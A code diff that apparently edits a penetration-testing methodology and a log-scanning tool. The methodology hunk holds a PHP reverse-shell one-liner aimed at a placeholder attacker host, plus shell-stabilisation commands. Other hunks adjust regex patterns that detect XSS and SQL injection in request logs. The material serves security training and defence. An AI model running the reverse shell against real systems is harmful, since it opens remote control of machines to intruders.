@@ -672,7 +672,8 @@ STEP 2 — Enumerate Open Services
 
 STEP 3 — Gain Initial Foothold
   - Find credentials in web app source, robots.txt, .git, backup files.
-  - Exploit a web vulnerability to get a reverse shell:
+  - Exploit a web vulnerability to get a reverse shell
+    (replace <LHOST> with your IP — only on machines you are authorised to test):
     php -r '$sock=fsockopen("<LHOST>",4444);exec("/bin/sh -i <&3 >&3 2>&3");'
   - Stabilise shell: python3 -c 'import pty;pty.spawn("/bin/bash")'
     then Ctrl+Z → stty raw -echo; fg → export TERM=xterm
@@ -743,7 +744,7 @@ LOG_PATTERNS = [
         "Review the associated request and ensure all queries use parameterised statements.",
     ),
     (
-        re.compile(r"<script[\s>]|<script$|onerror\s*=|javascript:", re.IGNORECASE),
+        re.compile(r"<script[\s>]|onerror\s*=|javascript:", re.IGNORECASE),
         "🚨 POSSIBLE XSS ATTEMPT",
         "Script tags or event handlers in request logs indicate attempted Cross-Site Scripting. "
         "Ensure output encoding and a Content Security Policy are in place.",
@@ -755,7 +756,7 @@ LOG_PATTERNS = [
         "outside the web root (e.g. /etc/passwd). Validate and sanitise file path inputs.",
     ),
     (
-        re.compile(r"(union|select|insert|drop|update|delete|exec|xp_).{0,80}(from|into|where|;)", re.IGNORECASE),
+        re.compile(r"(union|select|insert|drop|update|delete|exec|xp_).{0,80}?(from|into|where|;)", re.IGNORECASE),
         "🚨 SQL KEYWORD SEQUENCE",
         "SQL keywords in a request may indicate a SQL injection attempt. "
         "Review the originating IP and request parameters immediately.",
